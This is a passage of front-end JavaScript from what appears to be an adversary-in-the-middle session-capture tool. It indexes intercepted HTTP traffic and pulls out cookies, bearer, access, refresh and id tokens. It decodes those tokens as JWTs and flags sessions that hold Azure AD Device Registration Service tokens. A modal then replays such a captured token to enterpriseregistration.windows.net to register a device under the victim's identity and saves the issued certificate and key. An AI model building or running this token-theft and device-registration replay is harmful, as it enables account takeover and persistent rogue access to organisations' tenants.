      <tr><td>Tenant (tid)</td><td>${esc(info.tid||'—')}</td></tr>
      <tr><td>User (upn)</td><td>${esc(info.upn||'—')}</td></tr>
      <tr><td>Object id</td><td>${esc(info.oid||'—')}</td></tr>
      <tr><td>Issuer</td><td>${esc(info.iss||'—')}</td></tr>
      <tr><td>Audience</td><td>${esc(info.aud||'—')} ${info.valid_for_drs?'<span style="color:#86efac">✓ DRS</span>':'<span style="color:#fca5a5">✗ NOT DRS</span>'}</td></tr>
      <tr><td>Scopes</td><td><code style="color:#fbbf24">${esc(info.scp||'—')}</code></td></tr>
      <tr><td>AMR claims</td><td>${esc((info.amr||[]).join(', ')||'—')}</td></tr>
      <tr><td>Expiry</td><td><span style="${expClass}">${esc(expText)}</span></td></tr>
      <tr><td>From row</td><td>#${esc(String(seq))} ${esc(e.method||'')} ${esc((e.url||'').slice(0,80))}</td></tr>
    </table>
    <div style="display:flex;gap:8px;margin:12px 0;align-items:center">
      <label style="font-size:13px;color:#94a3b8">Device name</label>
      <input id="drs-name" placeholder="auto-generated if blank" style="flex:1">
      <label style="font-size:13px;color:#94a3b8">Join type</label>
      <select id="drs-jointype" style="background:#1a1a2e;border:1px solid #334155;color:#cbd5e1;padding:4px;border-radius:3px">
        <option value="0" selected>0 — AAD Join</option>
        <option value="4">4 — Workplace Join (BYOD)</option>
      </select>
    </div>
    ${allowOn
      ? '<div class="ok"><b>Server gate is ON</b> (<code>allow_drs_replay=true</code>). Confirm below to proceed.</div>'
      : '<div class="danger"><b>Server gate is OFF.</b> Set <code>allow_drs_replay=true</code> in Settings before this will execute. Confirm below has no effect until you do.</div>'}
    <div id="drs-result" style="margin:8px 0"></div>
    <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px">
      <button class="btn" onclick="_closeDrsModal()">Cancel</button>
      <button class="btn" id="drs-confirm" style="background:#7c2d12;color:#fed7aa;border-color:#c2410c"
        ${(!info.valid_for_drs||info.expired||!allowOn)?'disabled':''}
        onclick="submitDrsReplay('${esc(token)}')">Confirm — register device</button>
    </div>
  </div>`;
  // Click outside the panel to dismiss.
  host.addEventListener('click',(ev)=>{if(ev.target===host)_closeDrsModal()});
  document.body.appendChild(host);
}
async function submitDrsReplay(token){
  const btn=document.getElementById('drs-confirm');
  const result=document.getElementById('drs-result');
  if(!btn||!result)return;
  btn.disabled=true;btn.textContent='Registering…';
  result.innerHTML='<div style="color:#94a3b8;font-size:12px">POSTing to enterpriseregistration.windows.net…</div>';
  try{
    const r=await apiFetch('/api/devices/drs-register-from-token',{
      method:'POST',
      body:JSON.stringify({
        token,
        device_name:document.getElementById('drs-name').value||'',
        join_type:Number(document.getElementById('drs-jointype').value||0),
        confirm:true,
      })
    });
    const data=await r.json();
    if(data.ok){
      const c=data.credential||{};
      result.innerHTML=`<div class="ok">
        <b>Registration succeeded.</b><br>
        Credential id: <code>${esc(c.id||'')}</code><br>
        Device id: <code>${esc(c.device_id||'')}</code><br>
        Membership: <code>${esc(c.membership_type||'')}</code><br>
        Cert + key persisted to <code>$DATA_DIR/device_credentials/${esc(c.id||'')}.{json,enc}</code><br>
        <a href="#" onclick="_closeDrsModal();switchTab('devices');return false" style="color:#7dd3fc">Open Devices tab → Registered devices (DRS) ▸</a>
      </div>`;
      btn.textContent='Done';
      // Refresh the Devices tab list in the background so the new
      // credential is there when the operator switches over.
      if(typeof renderDrsCredentialsList==='function')renderDrsCredentialsList();
    }else{
      result.innerHTML=`<div class="danger"><b>Failed:</b> ${esc(data.error||'unknown')}<br>
        <span style="color:#94a3b8;font-size:11px">HTTP ${esc(String(data.http_status||'—'))}</span>
        ${data.drs_response?`<details style="margin-top:6px"><summary style="cursor:pointer">Raw DRS response</summary><pre style="margin-top:4px;font-size:11px">${esc(JSON.stringify(data.drs_response,null,2).slice(0,2000))}</pre></details>`:''}
      </div>`;
      btn.disabled=false;btn.textContent='Retry';
    }
  }catch(err){
    result.innerHTML=`<div class="danger">Request failed: ${esc(String(err))}</div>`;
    btn.disabled=false;btn.textContent='Retry';
  }
}
function renderReclassifyBanner(d){
  const el=document.getElementById('flow-reclassify-banner');
  if(!el)return;
  if(!d||d.session_id!==flowSelectedSid){el.style.display='none';return}
  const kindEntries=Object.entries(d.kinds||{});
  const kinds=kindEntries.length
    ? kindEntries.map(([k,n])=>`<span class="flow-ms-badge ${esc(k)}" style="margin:0 4px 0 0">${esc(k.toUpperCase())} ×${n}</span>`).join('')
    : '<span style="color:#fbbf24">no kinds matched</span>';
  const yamlOk=d.yaml_idp_host_count>0 && d.yaml_token_re_compiled && d.yaml_login_re_compiled;
  const yamlNote=yamlOk
    ? `<span style="color:#4ade80">YAML loaded (${d.yaml_idp_host_count} idp_hosts, ${d.yaml_session_cookie_count} session cookies)</span>`
    : `<span style="color:#f87171">YAML problem — idp_hosts=${d.yaml_idp_host_count}, login_re=${d.yaml_login_re_compiled?'ok':'NO'}, token_re=${d.yaml_token_re_compiled?'ok':'NO'}</span>`;
  let body=`<div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center">
    <b style="color:#7dd3fc">Reclassify result</b>
    <span>tagged <b style="color:#fff">${d.tagged}</b> / ${d.cleared} rows</span>
    <span style="color:#64748b">·</span>
    <span>${kinds}</span>
    <span style="color:#64748b">·</span>
    <span>req_body=${d.with_req_body} resp_body=${d.with_resp_body} token_paths=${d.token_endpoint_hits} idp_hosts=${d.idp_host_hits}</span>
    <span style="color:#64748b">·</span>
    ${yamlNote}
    <span style="flex:1"></span>
    <button class="btn" style="padding:2px 8px;font-size:11px" onclick="document.getElementById('flow-reclassify-banner').style.display='none'">Dismiss</button>
  </div>`;
  // Untagged-token-path samples — when a token endpoint slipped through,
  // show why so the operator can tell whether it's a path-regex gap, a
  // missing grant_type alias, or a captured-body gap.
  if(d.samples && d.samples.length){
    body+=`<details style="margin-top:6px;color:#94a3b8"><summary style="cursor:pointer;color:#fbbf24">${d.samples.length} token-path row${d.samples.length===1?'':'s'} did NOT tag — click to inspect</summary>
      <div style="margin-top:6px;font-family:monospace;font-size:11px">
      ${d.samples.map(s=>`<div style="margin:4px 0;padding:6px;background:#0a0a14;border:1px solid #1e293b;border-radius:3px">
        #${esc(String(s.seq))} <span style="color:#7dd3fc">${esc(String(s.method))}</span> ${esc(s.url)} → <span style="color:#cbd5e1">${esc(String(s.status))}</span><br>
        <span style="color:#64748b">req:</span> ${esc(s.req_body||'(empty)')}<br>
        <span style="color:#64748b">resp:</span> ${esc(s.resp_body||'(empty)')}
      </div>`).join('')}
      </div>
    </details>`;
  }
  el.innerHTML=body;
  el.style.display='';
}

// ── Index tab (found headers, cookies, tokens, body fields) ──
let idxSelectedSid='', idxSelectedKey=null, idxCurrentSeqIdx=0;

// Noise headers / fields that rarely carry auth/session state and clutter
// the index. Match is case-insensitive on the "name" part.
const IDX_DEFAULT_IGNORE=new Set([
  // Content negotiation
  'accept','accept-encoding','accept-language','accept-charset','accept-ranges',
  // Client hints / UA
  'user-agent','sec-ch-ua','sec-ch-ua-mobile','sec-ch-ua-platform',
  'sec-ch-ua-arch','sec-ch-ua-bitness','sec-ch-ua-full-version',
  'sec-ch-ua-full-version-list','sec-ch-ua-model','sec-ch-ua-platform-version',
  'sec-ch-ua-wow64','sec-fetch-dest','sec-fetch-mode','sec-fetch-site',
  'sec-fetch-user','sec-purpose','upgrade-insecure-requests',
  // Content metadata
  'content-type','content-length','content-encoding','content-language',
  'content-disposition','content-range',
  // Caching
  'cache-control','pragma','expires','age','etag','last-modified',
  'if-modified-since','if-none-match','if-match','if-unmodified-since',
  'vary','upload-time',
  // Transport
  'connection','keep-alive','host','transfer-encoding','upgrade','te','trailer',
  'date','server','via','forwarded',
  // CORS
  'access-control-allow-methods','access-control-allow-headers',
  'access-control-allow-origin','access-control-allow-credentials',
  'access-control-expose-headers','access-control-max-age',
  'access-control-request-method','access-control-request-headers',
  'origin','referer','referrer-policy',
  // Security policy (response)
  'strict-transport-security','content-security-policy','content-security-policy-report-only',
  'x-content-type-options','x-frame-options','x-xss-protection',
  'permissions-policy','feature-policy',
  'cross-origin-opener-policy','cross-origin-embedder-policy','cross-origin-resource-policy',
  'x-permitted-cross-domain-policies',
  // Observability / CDN
  'alt-svc','x-powered-by','x-served-by','x-timer','x-cache','x-cache-hits',
  'x-amz-cf-id','x-amz-cf-pop','x-amz-request-id','x-amz-id-2',
  'cf-ray','cf-cache-status','server-timing','x-request-id','x-trace-id',
  'x-azure-ref','x-msedge-ref',
  'report-to','reporting-endpoints','nel','p3p','x-robots-tag','x-dns-prefetch-control',
  'priority',
]);

const IDX_CUSTOM_STORAGE_KEY='bitm.idx.customIgnore';
function _idxLoadCustomIgnore(){
  try{const v=JSON.parse(localStorage.getItem(IDX_CUSTOM_STORAGE_KEY)||'[]');return new Set(v.map(s=>String(s).toLowerCase()))}
  catch(_){return new Set()}
}
function _idxSaveCustomIgnore(set){
  try{localStorage.setItem(IDX_CUSTOM_STORAGE_KEY, JSON.stringify([...set]))}catch(_){}
}
let idxCustomIgnore=_idxLoadCustomIgnore();

function isIgnoredName(name){
  if(!name)return false;
  const n=name.toLowerCase();
  if(IDX_DEFAULT_IGNORE.has(n))return true;
  if(idxCustomIgnore.has(n))return true;
  return false;
}
function addIgnoreName(name){
  idxCustomIgnore.add(String(name).toLowerCase());
  _idxSaveCustomIgnore(idxCustomIgnore);
  renderIndex();
  renderIgnoreManager();
}
function _idxManagerOpen(){
  const el=document.getElementById('idx-ignore-manager');
  return !!(el && el.style.display!=='none' && el.style.display!=='');
}

// Split only on the FIRST occurrence of the separator. JS's split(s, 2)
// truncates — we need to keep the tail intact because the item key itself
// contains ␟ (name + '␟' + value).
function _idxSplitFirst(s){
  const i=(s||'').indexOf('␟');
  return i<0?[s,'']:[s.slice(0,i), s.slice(i+1)];
}

function _idxRecomputeActiveSeqs(){
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  const next=new Set();
  for(const fullKey of idxFlaggedItems){
    const [group,key]=_idxSplitFirst(fullKey);
    const obj=(idx[group]||{})[key];
    if(obj){for(const s of obj.seqs)next.add(s)}
  }
  idxActiveSeqs=next;
}

function idxClearFlags(){
  // Drop every taint value that came from a currently-flagged item, so
  // highlighting clears too. Other taints (manually entered, etc.) are left
  // alone.
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  for(const fullKey of idxFlaggedItems){
    const [group,key]=_idxSplitFirst(fullKey);
    const obj=(idx[group]||{})[key];
    if(obj)removeTaintValue(obj.value);
  }
  idxFlaggedItems.clear();
  idxActiveSeqs=new Set();
  renderIndex();
  if(currentTab==='flow')renderFlow();
}

function idxToggleGroup(key){
  if(idxCollapsedGroups.has(key))idxCollapsedGroups.delete(key);
  else idxCollapsedGroups.add(key);
  renderIndex();
}
function idxCollapseAll(){
  // Populate collapsedGroups with every name currently rendered so the view
  // shows only headers.
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  idxCollapsedGroups=new Set();
  for(const group of Object.keys(idx)){
    const seen=new Set();
    for(const k of Object.keys(idx[group]||{})){
      const n=idx[group][k].name;
      if(seen.has(n))continue;
      seen.add(n);
      idxCollapsedGroups.add(group+'|'+n);
    }
  }
  renderIndex();
}
function idxExpandAll(){
  idxCollapsedGroups=new Set();
  renderIndex();
}

// Header-row checkbox — toggles every value under this name at once.
// Flag mode: add/remove all variants from idxFlaggedItems. Ignore mode:
// add/remove the name from the ignore list (same confirm prompt as before).
function idxGroupClicked(cb, name, group){
  if(_idxManagerOpen()){
    if(cb.checked){
      const count=(function(){try{
        const idx=buildIndex(flowBySession[idxSelectedSid]||[])[group]||{};
        let n=0;for(const k of Object.keys(idx))if(idx[k].name===name)n+=idx[k].seqs.length;
        return n;
      }catch(_){return '?'}})();
      const msg=`Hide "${name}"?\n\nOK → add to ignore list (${count} transaction${count===1?'':'s'} affected).\nCancel → leave it visible.`;
      if(confirm(msg)){addIgnoreName(name)} else {cb.checked=false}
    } else {
      removeIgnoreName(name);
    }
    return;
  }
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  const sect=idx[group]||{};
  for(const [k,o] of Object.entries(sect)){
    if(o.name!==name)continue;
    const fullKey=group+'␟'+k;
    if(cb.checked){
      idxFlaggedItems.add(fullKey);
      addTaint(o.value);
    } else {
      idxFlaggedItems.delete(fullKey);
      removeTaintValue(o.value);
    }
  }
  _idxRecomputeActiveSeqs();
  renderIndex();
  if(currentTab==='flow')renderFlow();
}

function idxCheckboxClicked(cb, name, group, key){
  const fullKey=group+'␟'+key;

  // If the ignore-list manager is open, treat the checkbox as the ignore
  // toggle (same prompt as before). Otherwise it's a "flag for red-dot
  // highlighting in Flow Trace" toggle.
  if(_idxManagerOpen()){
    if(cb.checked){
      const count=(function(){try{return (buildIndex(flowBySession[idxSelectedSid]||[])[group]||{})[key].seqs.length}catch(_){return '?'}})();
      const msg=`Hide "${name}"?\n\n` +
                `OK → add to ignore list (hide every item with this name, ` +
                `${count} transaction${count===1?'':'s'} affected).\n` +
                `Cancel → leave it visible.`;
      if(confirm(msg)){
        addIgnoreName(name);
      } else {
        cb.checked=false;
      }
    } else {
      removeIgnoreName(name);
    }
    return;
  }

  // Default mode: toggle the item's membership in the flagged set, so red
  // dots appear/disappear on the matching Flow Trace rows. Also keep the
  // taint-highlight list in sync so the value lights up (yellow) inside the
  // Flow Trace detail pane as the user skips through transactions.
  const entries=flowBySession[idxSelectedSid]||[];
  const obj=(buildIndex(entries)[group]||{})[key];
  if(cb.checked){
    idxFlaggedItems.add(fullKey);
    if(obj)addTaint(obj.value);
  } else {
    idxFlaggedItems.delete(fullKey);
    if(obj)removeTaintValue(obj.value);
  }
  _idxRecomputeActiveSeqs();
  renderIndex();
  // If the Flow Trace is currently visible, refresh it so dots update live.
  if(currentTab==='flow')renderFlow();
}
function removeIgnoreName(name){
  idxCustomIgnore.delete(String(name).toLowerCase());
  _idxSaveCustomIgnore(idxCustomIgnore);
  renderIndex();
  renderIgnoreManager();
}
function toggleIgnoreManager(){
  const el=document.getElementById('idx-ignore-manager');
  const open=el.style.display==='none';
  el.style.display=open?'block':'none';
  if(open)renderIgnoreManager();
  // Checkbox semantics change based on whether the manager is open, so
  // re-render the index rows to swap their colour + tooltip + state.
  renderIndex();
}
function renderIgnoreManager(){
  const el=document.getElementById('idx-ignore-manager');
  if(!el||el.style.display==='none')return;
  const custom=[...idxCustomIgnore].sort();
  const def=[...IDX_DEFAULT_IGNORE].sort();
  el.innerHTML=`
    <div style="display:flex;gap:20px;align-items:flex-start">
      <div style="flex:1">
        <div style="color:#7dd3fc;font-weight:600;margin-bottom:4px">Custom ignore list (${custom.length})</div>
        <div style="color:#64748b;font-size:11px;margin-bottom:6px">Click × to remove. Check the box on any index row to add it here.</div>
        <div style="display:flex;flex-wrap:wrap;gap:4px;min-height:24px">
          ${custom.length?custom.map(n=>`<span style="background:#1e293b;color:#e2e8f0;padding:2px 6px;border-radius:10px;font-size:11px">${esc(n)} <span style="cursor:pointer;color:#f87171" onclick="removeIgnoreName('${esc(n).replace(/'/g,"&#39;")}')">×</span></span>`).join(''):'<span style="color:#64748b;font-style:italic">(empty)</span>'}
        </div>
        <div style="display:flex;gap:6px;margin-top:8px">
          <input id="idx-custom-add" class="cfg-input" placeholder="add a name to ignore (e.g. x-my-header)" style="flex:1;font-size:12px" onkeydown="if(event.key==='Enter'){addIgnoreName(this.value);this.value=''}">
          <button class="btn" style="padding:3px 10px;font-size:12px" onclick="const v=document.getElementById('idx-custom-add');addIgnoreName(v.value);v.value=''">Add</button>
          <button class="btn" style="padding:3px 10px;font-size:12px;border-color:#ef4444;background:#3f1111;color:#fca5a5" onclick="if(confirm('Clear custom ignore list?')){idxCustomIgnore=new Set();_idxSaveCustomIgnore(idxCustomIgnore);renderIndex();renderIgnoreManager()}">Clear</button>
        </div>
      </div>
      <div style="flex:1">
        <div style="color:#94a3b8;font-weight:600;margin-bottom:4px">Default ignore list (${def.length}, read-only)</div>
        <div style="color:#64748b;font-size:11px;margin-bottom:6px">Built-in noise filters — transport, caching, CORS preflight, client hints, CDN/observability.</div>
        <div style="display:flex;flex-wrap:wrap;gap:3px;max-height:110px;overflow:auto">
          ${def.map(n=>`<span style="background:#1a1a2e;color:#94a3b8;padding:2px 6px;border-radius:10px;font-size:11px">${esc(n)}</span>`).join('')}
        </div>
      </div>
    </div>
  `;
}

function refreshIndexSessionList(){
  const sel=document.getElementById('idx-sid-select');
  const sids=Object.keys(flowBySession).length?Object.keys(flowBySession):Object.keys(knownSessions);
  // Same priority order as refreshFlowSessionList — pinnedSid wins
  // when it's still a known session so switching to Index keeps
  // looking at whichever session you had selected in Flow Trace.
  const candidates=[
    pinnedSid,
    idxSelectedSid,
    flowSelectedSid,
    sel.value,
  ].filter(Boolean);
  let prev='';
  for(const c of candidates){if(sids.includes(c)){prev=c;break}}
  if(!prev)prev=sids[0]||'';
  sel.innerHTML=sids.map(s=>{
    const label=sessionLabel(s) + ' — ' + s.slice(-10);
    return `<option value="${esc(s)}"${s===prev?' selected':''}>${esc(label)}</option>`;
  }).join('');
  idxSelectedSid=sel.value;
  if(idxSelectedSid)pinnedSid=idxSelectedSid;
  if(idxSelectedSid&&!flowBySession[idxSelectedSid]){send({cmd:'get_flow',session_id:idxSelectedSid})}
  renderIndex();
}

function _idxAdd(map, name, value, seq, dir, host){
  if(value==null)return;
  const v=String(value);
  if(!v)return;
  const key=name+'␟'+v;  // Unit-separator between name and value
  if(!map[key])map[key]={name, value:v, seqs:[], dir:dir||'req', hosts:new Set()};
  // If the same value appears in both req and resp, tag as 'both'.
  if(dir && map[key].dir!==dir && map[key].dir!=='both')map[key].dir='both';
  if(!map[key].seqs.includes(seq))map[key].seqs.push(seq);
  if(host)map[key].hosts.add(host);
}

function _idxCookiePairs(cookieStr){
  // "a=b; c=d" -> [["a","b"],["c","d"]]
  return (cookieStr||'').split(/;\s*/).filter(Boolean).map(p=>{
    const i=p.indexOf('='); return i<0?[p,'']:[p.slice(0,i),p.slice(i+1)];
  });
}

function _idxSetCookieName(sc){
  // "session=abc; Path=/; HttpOnly" -> "session"
  const first=(sc||'').split(';',1)[0]||'';
  const i=first.indexOf('='); return i<0?first.trim():first.slice(0,i).trim();
}

function _idxParseBodyFields(body, contentType){
  if(!body)return [];
  const ct=(contentType||'').toLowerCase();
  const pairs=[];
  if(ct.includes('application/x-www-form-urlencoded')||(!ct&&/^[\w.%-]+=[^&=]*(&|$)/.test(body.slice(0,80)))){
    for(const pair of body.split('&')){
      const i=pair.indexOf('=');
      if(i>=0){
        try{pairs.push([decodeURIComponent(pair.slice(0,i)), decodeURIComponent(pair.slice(i+1))])}
        catch(_){pairs.push([pair.slice(0,i), pair.slice(i+1)])}
      }
    }
  } else if(ct.includes('application/json')||(body.trim().startsWith('{')||body.trim().startsWith('['))){
    try{
      const obj=JSON.parse(body);
      const walk=(o,prefix)=>{
        if(o==null)return;
        if(typeof o==='object'){
          if(Array.isArray(o)){o.forEach((v,i)=>walk(v, prefix?`${prefix}[${i}]`:`[${i}]`))}
          else{for(const k of Object.keys(o))walk(o[k], prefix?`${prefix}.${k}`:k)}
        } else {
          pairs.push([prefix||'(root)', String(o)]);
        }
      };
      walk(obj,'');
    } catch(_){}
  }
  return pairs;
}

// ── JWT decode (no signature verification) ────────────────────────
// Returns {header, payload, alg, raw_short} or null. Adds derived
// `_exp_readable`, `_expires_in`, `_expired_ago` to payload when an
// `exp` claim is present.
function _b64urlDecode(s){
  s=String(s||'').replace(/-/g,'+').replace(/_/g,'/');
  while(s.length%4)s+='=';
  try{return decodeURIComponent(escape(atob(s)))}catch(_){
    try{return atob(s)}catch(__){return ''}
  }
}
function _decodeJwt(token){
  if(!token||typeof token!=='string')return null;
  const parts=token.split('.');
  if(parts.length<2)return null;
  if(!/^[A-Za-z0-9_\-]+$/.test(parts[0])||!/^[A-Za-z0-9_\-]+$/.test(parts[1]))return null;
  let h={},p={};
  try{h=JSON.parse(_b64urlDecode(parts[0]))}catch(_){return null}
  try{p=JSON.parse(_b64urlDecode(parts[1]))}catch(_){return null}
  if(typeof p!=='object'||p==null)return null;
  if(typeof p.exp==='number'){
    const now=Math.floor(Date.now()/1000);
    const diff=p.exp-now;
    p._exp_readable=new Date(p.exp*1000).toISOString();
    if(diff>=0){
      const d=Math.floor(diff/86400),hr=Math.floor((diff%86400)/3600),mn=Math.floor((diff%3600)/60);
      p._expires_in=`${d?d+'d ':''}${hr?hr+'h ':''}${mn}m`.trim();
    } else {
      const a=-diff,d=Math.floor(a/86400),hr=Math.floor((a%86400)/3600),mn=Math.floor((a%3600)/60);
      p._expired_ago=`${d?d+'d ':''}${hr?hr+'h ':''}${mn}m`.trim();
    }
  }
  if(typeof p.iat==='number')p._iat_readable=new Date(p.iat*1000).toISOString();
  if(typeof p.nbf==='number')p._nbf_readable=new Date(p.nbf*1000).toISOString();
  return {header:h, payload:p, alg:h&&h.alg||'?', raw_short:token.slice(0,12)+'…'};
}
// AAD Device Registration Service resource ID — the audience that
// makes a captured access_token replayable for device registration.
const _DRS_RESOURCE_ID='01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9';
const _DRS_AUD_URN='urn:ms-drs:enterpriseregistration.windows.net';
function _isDrsAud(aud){
  if(!aud)return false;
  if(Array.isArray(aud))return aud.some(a=>_isDrsAud(a));
  const s=String(aud);
  return s.includes(_DRS_RESOURCE_ID)||s.includes(_DRS_AUD_URN);
}
// Walk a flow entry's request Authorization header; if it carries a
// Bearer JWT whose `aud` claim is the DRS resource, return the raw
// token. Used to flag rows that can drive a registration replay.
function _drsTokenFromEntry(e){
  const reqH=e.request_headers||{};
  for(const [k,v] of Object.entries(reqH)){
    if(k.toLowerCase()!=='authorization')continue;
    const m=String(v||'').match(/^Bearer\s+([A-Za-z0-9_\-\.]+)/i);
    if(!m)continue;
    const dec=_decodeJwt(m[1]);
    if(dec && _isDrsAud(dec.payload?.aud))return m[1];
  }
  return '';
}
// Per-session walker: does this session's captured flow contain a
// DRS-scoped Bearer token anywhere? Powers the ⚡ / ☐ indicator on
// the Flow Trace session selector. Short-circuits on first hit so
// the cost stays O(rows-up-to-first-DRS) per session — usually
// resolves in the first few entries when present.
function _sessionHasDrsToken(sid){
  const entries=flowBySession[sid];
  if(!entries)return false;
  for(let i=0;i<entries.length;i++){
    if(_drsTokenFromEntry(entries[i]))return true;
  }
  return false;
}

// Pick a one-line summary of a decoded JWT for the index row.
function _jwtSummary(dec){
  if(!dec||!dec.payload)return '';
  const p=dec.payload;
  const subj=p.sub||p.preferred_username||p.upn||p.email||p.unique_name||p.oid||'';
  const aud=Array.isArray(p.aud)?p.aud.join(','):(p.aud||'');
  const scp=p.scp||p.scope||(Array.isArray(p.roles)?p.roles.join(' '):'');
  const tid=p.tid||'';
  const exp=p._expired_ago?`expired ${p._expired_ago} ago`:(p._expires_in?`exp in ${p._expires_in}`:'');
  return [aud&&'aud='+aud, subj&&'sub='+subj, tid&&'tid='+tid, scp&&'scp='+scp, exp].filter(Boolean).join(' · ');
}
// Walk a flow entry and yield every JWT we find with a source label.
function _idxScanJwts(e){
  const out=[];
  const seq=e.seq;
  let host='';
  try{host=(new URL(e.url).hostname||'').toLowerCase()}catch(_){}
  // Authorization: Bearer <jwt>
  const grabAuth=(headers,dir)=>{
    if(!headers)return;
    for(const [k,v] of Object.entries(headers)){
      if(k.toLowerCase()!=='authorization')continue;
      const m=String(v||'').match(/^Bearer\s+([A-Za-z0-9_\-\.]+)/i);
      if(m){const dec=_decodeJwt(m[1]);if(dec)out.push({source:`Authorization (${dir})`, token:m[1], dec, seq, host, dir})}
    }
  };
  grabAuth(e.request_headers,'req');
  grabAuth(e.response_headers,'resp');
  // JSON body fields id_token / access_token / refresh_token / etc.
  const grabBody=(body, headers, dir)=>{
    if(!body)return;
    const ct=(headers&&(headers['content-type']||headers['Content-Type']))||'';
    for(const [k,v] of _idxParseBodyFields(body, ct)){
      if(!/^(access_token|id_token|refresh_token|accessToken|idToken|refreshToken|jwt|sessionToken)$/i.test(k))continue;
      const dec=_decodeJwt(String(v||''));
      if(dec)out.push({source:`body.${k} (${dir})`, token:String(v||''), dec, seq, host, dir});
    }
  };
  grabBody(e.request_body, e.request_headers,'req');
  grabBody(e.response_body, e.response_headers,'resp');
  // Set-Cookie values that happen to be JWTs (rare but real).
  const respH=e.response_headers||{};
  for(const [k,v] of Object.entries(respH)){
    if(k.toLowerCase()!=='set-cookie')continue;
    const arr=Array.isArray(v)?v:String(v||'').split('\n');
    for(const sc of arr){
      const name=_idxSetCookieName(sc);
      const val=(String(sc).split(';',1)[0]||'').split('=').slice(1).join('=');
      const dec=_decodeJwt(val);
      if(dec)out.push({source:`cookie ${name} (resp)`, token:val, dec, seq, host, dir:'resp'});
    }
  }
  return out;
}

function buildIndex(entries){
  // Returns {reqHeaders, respHeaders, cookies, bearerTokens, bodyFields, decodedJwts}
  // where each is a dict keyed by "name␟value" -> {name,value,seqs:[],dir,hosts:Set}.
  // decodedJwts entries also carry .dec (the decoded {header,payload,alg}).
  const out={reqHeaders:{}, respHeaders:{}, cookies:{}, bearerTokens:{}, bodyFields:{}, decodedJwts:{}};
  for(const e of entries){
    const seq=e.seq;
    const reqH=e.request_headers||{};
    const respH=e.response_headers||{};
    let host='';
    try{host=(new URL(e.url).hostname||'').toLowerCase()}catch(_){}

    for(const [k,v] of Object.entries(reqH)){
      const low=k.toLowerCase();
      if(low==='authorization'){
        const s=String(v||'');
        if(/^bearer\s+/i.test(s)){
          _idxAdd(out.bearerTokens, 'Bearer (request)', s.replace(/^bearer\s+/i,''), seq, 'req', host);
        } else {
          _idxAdd(out.reqHeaders, k, v, seq, 'req', host);
        }
      } else if(low==='cookie'){
        for(const [cn,cv] of _idxCookiePairs(v)){
          _idxAdd(out.cookies, `Cookie: ${cn}`, cv, seq, 'req', host);
        }
      } else {
        _idxAdd(out.reqHeaders, k, v, seq, 'req', host);
      }
    }

    for(const [k,v] of Object.entries(respH)){
      const low=k.toLowerCase();
      if(low==='set-cookie'){
        const name=_idxSetCookieName(v);
        const val=(String(v).split(';',1)[0]||'').split('=').slice(1).join('=');
        _idxAdd(out.cookies, `Set-Cookie: ${name}`, val, seq, 'resp', host);
      } else if(low==='authorization'){
        const s=String(v||'');
        if(/^bearer\s+/i.test(s)){
          _idxAdd(out.bearerTokens, 'Bearer (response)', s.replace(/^bearer\s+/i,''), seq, 'resp', host);
        } else {
          _idxAdd(out.respHeaders, k, v, seq, 'resp', host);
        }
      } else {
        _idxAdd(out.respHeaders, k, v, seq, 'resp', host);
      }
    }

    // Request body fields
    const ct=reqH['content-type']||reqH['Content-Type']||'';
    for(const [k,v] of _idxParseBodyFields(e.request_body||'', ct)){
      _idxAdd(out.bodyFields, k, v, seq, 'req', host);
      // Also pull bearer tokens / access_token JSON fields into bearerTokens
      if(/^(access_token|id_token|refresh_token|accessToken|idToken|refreshToken|jwt|sessionToken)$/.test(k)){
        _idxAdd(out.bearerTokens, `body.${k}`, v, seq, 'req', host);
      }
    }

    // Response body — also scan for JWT-ish tokens embedded in JSON
    if(e.response_body){
      const respCT=respH['content-type']||respH['Content-Type']||'';
      for(const [k,v] of _idxParseBodyFields(e.response_body, respCT)){
        if(/^(access_token|id_token|refresh_token|accessToken|idToken|refreshToken|jwt|sessionToken)$/.test(k)){
          _idxAdd(out.bearerTokens, `body.${k}`, v, seq, 'resp', host);
        }
      }
    }

    // Decoded JWTs — surface every JWT we can find (Authorization
    // headers, body id_token/access_token/refresh_token, cookies)
    // with claim summaries so the analyst doesn't have to copy-paste
    // tokens through jwt.io. Decoder runs in-browser; no signature
    // verification — same posture as the existing /api/browser/test/decode.
    for(const j of _idxScanJwts(e)){
      const summary=_jwtSummary(j.dec);
      const labelKey=j.source+'␟'+(j.dec.payload.sub||j.dec.payload.aud||'?');
      if(!out.decodedJwts[labelKey]){
        out.decodedJwts[labelKey]={
          name:j.source,
          value:summary||(j.dec.payload.iss||'(decoded JWT)'),
          seqs:[], dir:j.dir||'req', hosts:new Set(),
          dec:j.dec, raw_short:(j.token||'').slice(0,16)+'…',
        };
      }
      const o=out.decodedJwts[labelKey];
      if(!o.seqs.includes(seq))o.seqs.push(seq);
      if(host)o.hosts.add(host);
      if(j.dir && o.dir!==j.dir && o.dir!=='both')o.dir='both';
    }
  }
  return out;
}

function renderIndex(){
  const sel=document.getElementById('idx-sid-select');
  idxSelectedSid=sel.value;
  let entries=flowBySession[idxSelectedSid]||[];

  // Marker-range filter — only build the index from transactions within the
  // Flow Trace start/end markers for this session.
  const markersOnly=document.getElementById('idx-markers-only')?.checked;
  const m=flowMarkers[idxSelectedSid]||{};
  if(markersOnly && (m.start!=null || m.end!=null)){
    entries=entries.filter(e=>{
      if(m.start!=null && e.seq<m.start)return false;
      if(m.end!=null   && e.seq>m.end)  return false;
      return true;
    });
  }

  const idx=buildIndex(entries);
  const q=(document.getElementById('idx-search').value||'').toLowerCase();
  const showIgnored=document.getElementById('idx-show-ignored')?.checked;
  const dirFilter=(document.getElementById('idx-direction')?.value)||'all';
  const groupBy=(document.getElementById('idx-groupby')?.value)||'name';

  // Populate the site filter dropdown from all observed hosts.
  const allHosts=new Set();
  for(const section of Object.values(idx)){
    for(const o of Object.values(section)){
      for(const h of (o.hosts||new Set())) allHosts.add(h);
    }
  }
  const siteSel=document.getElementById('idx-site-filter');
  if(siteSel){
    const prev=siteSel.value||'';
    const opts=['<option value="">any</option>']
      .concat([...allHosts].sort().map(h=>`<option value="${esc(h)}"${h===prev?' selected':''}>${esc(h)}</option>`));
    siteSel.innerHTML=opts.join('');
  }
  const siteFilter=siteSel?siteSel.value:'';

